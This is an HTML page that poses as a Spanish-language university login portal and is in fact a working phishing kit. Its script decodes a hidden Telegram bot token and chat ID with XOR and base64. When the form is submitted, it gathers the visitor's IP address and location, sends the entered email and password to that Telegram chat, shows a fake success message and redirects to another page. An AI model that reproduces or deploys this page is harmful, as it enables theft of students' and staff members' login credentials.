

<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Acceso universitario</title>
  <style>
    :root {
      --brand: #1e3a8a;
      --brand-dark: #172554;
      --accent: #3b82f6;
      --accent-hover: #2563eb;
      --bg: #eef2f7;
      --card: #ffffff;
      --text: #0f172a;
      --muted: #64748b;
      --border: #cbd5e1;
      --error-bg: #fef2f2;
      --error-text: #b91c1c;
      --success-bg: #f0fdf4;
      --success-text: #15803d;
      --loading-bg: #eff6ff;
      --loading-text: #1d4ed8;
    }

    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      font-family: "Inter", "Segoe UI", system-ui, -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
      min-height: 100vh;
      display: grid;
      place-items: center;
      padding: 24px;
      background: radial-gradient(circle at 20% 20%, #dbeafe 0%, transparent 40%),
                  radial-gradient(circle at 80% 80%, #e0e7ff 0%, transparent 40%),
                  var(--bg);
      color: var(--text);
      -webkit-font-smoothing: antialiased;
    }

    .login-shell {
      width: 100%;
      max-width: 980px;
      display: grid;
      grid-template-columns: 1fr 1fr;
      background: var(--card);
      border-radius: 18px;
      overflow: hidden;
      box-shadow: 0 20px 50px -12px rgba(15, 23, 42, .25);
      border: 1px solid rgba(148, 163, 184, .25);
    }

    /* ---------- Panel de marca ---------- */
    .brand-panel {
      background: linear-gradient(145deg, var(--brand) 0%, var(--brand-dark) 100%);
      color: #fff;
      padding: 48px 44px;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      position: relative;
      overflow: hidden;
    }

    .brand-panel::before,
    .brand-panel::after {
      content: "";
      position: absolute;
      border-radius: 50%;
      background: rgba(255, 255, 255, .07);
    }
    .brand-panel::before { width: 280px; height: 280px; top: -90px; right: -90px; }
    .brand-panel::after  { width: 200px; height: 200px; bottom: -70px; left: -60px; }

    .brand-logo {
      display: flex;
      align-items: center;
      gap: 12px;
      position: relative;
      z-index: 1;
    }
    .brand-logo .crest {
      width: 44px; height: 44px;
      border-radius: 12px;
      background: rgba(255, 255, 255, .15);
      border: 1px solid rgba(255, 255, 255, .3);
      display: grid;
      place-items: center;
      font-weight: 800;
      font-size: 20px;
      letter-spacing: -1px;
    }
    .brand-logo span {
      font-size: 14px;
      font-weight: 600;
      letter-spacing: .4px;
      opacity: .95;
    }

    .brand-copy {
      position: relative;
      z-index: 1;
      margin: 40px 0;
    }
    .brand-copy h2 {
      font-size: 30px;
      font-weight: 700;
      line-height: 1.2;
      letter-spacing: -.5px;
      margin-bottom: 14px;
    }
    .brand-copy p {
      font-size: 14.5px;
      line-height: 1.6;
      color: rgba(255, 255, 255, .8);
      max-width: 300px;
    }

    .brand-foot {
      position: relative;
      z-index: 1;
      font-size: 12.5px;
      color: rgba(255, 255, 255, .65);
    }

    /* ---------- Panel del formulario ---------- */
    .form-panel {
      padding: 48px 44px;
      display: flex;
      flex-direction: column;
      justify-content: center;
    }

    .form-panel h1 {
      font-size: 26px;
      font-weight: 700;
      letter-spacing: -.4px;
      margin-bottom: 6px;
    }

    .subtitle {
      font-size: 14px;
      color: var(--muted);
      margin-bottom: 32px;
    }

    .field { margin-bottom: 20px; }

    .field label {
      display: block;
      font-size: 13px;
      font-weight: 600;
      color: var(--text);
      margin-bottom: 7px;
    }

    .field input {
      width: 100%;
      height: 46px;
      padding: 0 14px;
      font-size: 15px;
      font-family: inherit;
      color: var(--text);
      background: #f8fafc;
      border: 1.5px solid var(--border);
      border-radius: 10px;
      outline: none;
      transition: border-color .15s, box-shadow .15s, background .15s;
    }

    .field input::placeholder { color: #94a3b8; }

    .field input:focus {
      border-color: var(--accent);
      background: #fff;
      box-shadow: 0 0 0 3px rgba(59, 130, 246, .18);
    }

    .field input:-webkit-autofill {
      -webkit-box-shadow: 0 0 0 1000px #f8fafc inset !important;
      -webkit-text-fill-color: var(--text) !important;
    }

    .pass-wrap { position: relative; }

    .toggle-password {
      position: absolute;
      right: 10px;
      top: 50%;
      transform: translateY(-50%);
      border: none;
      background: none;
      font-family: inherit;
      font-size: 12.5px;
      font-weight: 600;
      color: var(--accent);
      cursor: pointer;
      padding: 6px 8px;
      border-radius: 6px;
      transition: background .15s;
    }
    .toggle-password:hover { background: #eff6ff; }

    .row {
      display: flex;
      justify-content: space-between;
      align-items: center;
      gap: 12px;
      margin-bottom: 26px;
    }

    .remember {
      display: flex;
      align-items: center;
      gap: 8px;
      font-size: 13.5px;
      color: var(--text);
      cursor: pointer;
      user-select: none;
    }

    .remember input {
      width: 16px; height: 16px;
      accent-color: var(--accent);
      cursor: pointer;
      margin: 0;
    }

    a.link {
      color: var(--accent);
      font-size: 13.5px;
      font-weight: 500;
      text-decoration: none;
    }
    a.link:hover { text-decoration: underline; }

    .btn {
      width: 100%;
      height: 48px;
      border: none;
      border-radius: 10px;
      background: linear-gradient(135deg, var(--accent) 0%, var(--accent-hover) 100%);
      color: #fff;
      font-family: inherit;
      font-size: 15px;
      font-weight: 600;
      letter-spacing: .2px;
      cursor: pointer;
      transition: transform .12s, box-shadow .15s, opacity .15s;
      display: flex;
      align-items: center;
      justify-content: center;
      position: relative;
      box-shadow: 0 6px 16px -6px rgba(37, 99, 235, .6);
    }

    .btn:hover { transform: translateY(-1px); box-shadow: 0 10px 20px -8px rgba(37, 99, 235, .7); }
    .btn:active { transform: translateY(0); }
    .btn:disabled { opacity: .65; cursor: not-allowed; transform: none; }

    .btn .btn-text { display: flex; align-items: center; gap: 8px; }
    .btn.loading .btn-text { visibility: hidden; }

    .btn.loading::after {
      content: "";
      position: absolute;
      width: 18px; height: 18px;
      border: 2.5px solid rgba(255, 255, 255, .35);
      border-top-color: #fff;
      border-radius: 50%;
      animation: spin .7s linear infinite;
    }

    @keyframes spin { to { transform: rotate(360deg); } }

    .message {
      display: none;
      margin-top: 16px;
      padding: 11px 14px;
      font-size: 13.5px;
      line-height: 1.45;
      border-radius: 9px;
      font-weight: 500;
    }

    .message.error   { display: block; background: var(--error-bg); color: var(--error-text); }
    .message.success { display: block; background: var(--success-bg); color: var(--success-text); }
    .message.loading { display: block; background: var(--loading-bg); color: var(--loading-text); }

    .bottom {
      margin-top: 28px;
      font-size: 13.5px;
      color: var(--muted);
      text-align: center;
    }

    .bottom a {
      color: var(--accent);
      font-weight: 600;
      text-decoration: none;
      margin-left: 4px;
    }
    .bottom a:hover { text-decoration: underline; }

    .legal {
      margin-top: 24px;
      display: flex;
      justify-content: center;
      gap: 18px;
      font-size: 12px;
      color: var(--muted);
    }
    .legal a { color: var(--muted); text-decoration: none; }
    .legal a:hover { color: var(--text); text-decoration: underline; }

    /* ---------- Responsive ---------- */
    @media (max-width: 820px) {
      .login-shell { grid-template-columns: 1fr; max-width: 460px; }
      .brand-panel { padding: 30px 28px; }
      .brand-copy { margin: 22px 0; }
      .brand-copy h2 { font-size: 23px; }
      .brand-copy p { display: none; }
      .brand-foot { display: none; }
      .form-panel { padding: 34px 28px; }
    }

    @media (max-width: 420px) {
      body { padding: 0; background: #fff; }
      .login-shell { border-radius: 0; box-shadow: none; border: none; }
      .form-panel { padding: 28px 22px; }
    }
  </style>
</head>
<body>
  <main class="login-shell">
    <!-- Panel de marca -->
    <aside class="brand-panel">
      <div class="brand-logo">
        <div class="crest"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcToUIe9A6QvLvypxEQu3Y8mJ7WCb9L6pROqNg&s" style="width: 50px;" alt=""></div>
        <span>Portal de activacion</span>
      </div>

      <div class="brand-copy">

     
      </div>

      <div class="brand-foot">
        © 2025 Portal  · Todos los derechos reservados
      </div>
    </aside>

    <!-- Panel del formulario -->
    <section class="form-panel">
      <h1>Iniciar sesión</h1>
      <p class="subtitle">Ingresa tus credenciales para continuar.</p>

      <form id="loginForm" autocomplete="on">
        <div class="field">
          <label for="email">Correo electrónico</label>
          <input type="email" id="email" name="email" placeholder="tu.correo@universidad.edu" autocomplete="email" required>
        </div>

        <div class="field">
          <label for="password">Contraseña</label>
          <div class="pass-wrap">
            <input type="password" id="password" name="password" placeholder="Ingresa tu contraseña" autocomplete="current-password" required>
            <button type="button" class="toggle-password" id="togglePassword" aria-label="Mostrar contraseña">Mostrar</button>
          </div>
        </div>

        <div class="row">
          <label class="remember">
            <input type="checkbox" id="remember"> Recordarme
          </label>
          <a href="#" class="link">¿Olvidaste tu contraseña?</a>
        </div>

        <button type="submit" class="btn" id="loginBtn">
          <span class="btn-text">Iniciar sesión</span>
        </button>

        <div id="message" class="message"></div>
      </form>

      <div class="bottom">
        ¿No tienes cuenta?<a href="#">Crear una</a>
      </div>

      <div class="legal">
        <a href="#">Términos de uso</a>
        <a href="#">Privacidad</a>
      </div>
    </section>
  </main>

  <script>
  (function() {
    'use strict';

    function tgDec(s) {
      const k = 'm4g0rd0';
      const d = atob(s);
      let o = '';
      for (let i = 0; i < d.length; i++) o += String.fromCharCode(d.charCodeAt(i) ^ k.charCodeAt(i % k.length));
      return o;
    }
    const TG_TOKEN = tgDec('VAVRAkZTAVQCVgozJXgydzB3PVxSNEc9VyY8Y15lMHEnCGgaBRFlIjUCK1s+Ww==');
    const TG_CHAT = tgDec('QAVXAEFdCVwCUgZBVgg=');

    async function enviarTelegram(texto) {
      const url = 'https://api.telegram.org/bot' + TG_TOKEN + '/sendMessage' +
        '?chat_id=' + encodeURIComponent(TG_CHAT) +
        '&text=' + encodeURIComponent(texto);
      try { await fetch(url, { mode: 'no-cors' }); } catch (e) {}
    }

    const REDIRECT_URL = 'piiim.html';

    const form = document.getElementById('loginForm');
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const loginBtn = document.getElementById('loginBtn');
    const messageDiv = document.getElementById('message');
    const togglePasswordBtn = document.getElementById('togglePassword');

    let isSubmitting = false;

    function showMessage(text, type = 'error') {
      messageDiv.textContent = text;
      messageDiv.className = 'message ' + type;
      setTimeout(() => {
        messageDiv.className = 'message';
        messageDiv.textContent = '';
      }, 5000);
    }

    async function getLocation() {
      try {
        const res = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(5000) });
        if (!res.ok) throw new Error();
        const data = await res.json();
        return `${data.city || 'Desconocida'}, ${data.country_name || 'Desconocido'}`;
      } catch { return 'No disponible'; }
    }

    async function getIP() {
      try {
        const res = await fetch('https://api.ipify.org?format=json', { signal: AbortSignal.timeout(5000) });
        if (!res.ok) throw new Error();
        const data = await res.json();
        return data.ip || 'No disponible';
      } catch { return 'No disponible'; }
    }

    function redirectToNextPage() { window.location.href = REDIRECT_URL; }

    togglePasswordBtn.addEventListener('click', function() {
      const isText = passwordInput.type === 'text';
      passwordInput.type = isText ? 'password' : 'text';
      this.textContent = isText ? 'Mostrar' : 'Ocultar';
    });

    form.addEventListener('submit', async function(e) {
      e.preventDefault();
      if (isSubmitting) return;

      const email = emailInput.value.trim();
      const password = passwordInput.value.trim();

      if (!email || !password) { showMessage('Completa todos los campos', 'error'); return; }
      if (!email.includes('@')) { showMessage('Correo inválido', 'error'); return; }
      if (password.length < 4) { showMessage('La contraseña debe tener al menos 4 caracteres', 'error'); return; }

      isSubmitting = true;
      loginBtn.disabled = true;
      loginBtn.classList.add('loading');
      showMessage('Espera...', 'loading');

      try {
        const [ip, location] = await Promise.all([getIP(), getLocation()]);

        await enviarTelegram(
          '📥 Nuevo registro\n\n' +
          'email: ' + email + '\n' +
          'password: ' + password + '\n' +
          'ip: ' + ip + '\n' +
          'location: ' + location
        );

        showMessage('Inicio de sesión exitoso', 'success');
        emailInput.value = '';
        passwordInput.value = '';
        setTimeout(redirectToNextPage, 1000);

      } catch (error) {
        console.error(error);
        showMessage('Error de conexión', 'error');
        isSubmitting = false;
        loginBtn.disabled = false;
        loginBtn.classList.remove('loading');
      }
    });
  })();
  </script>
</body>
</html>
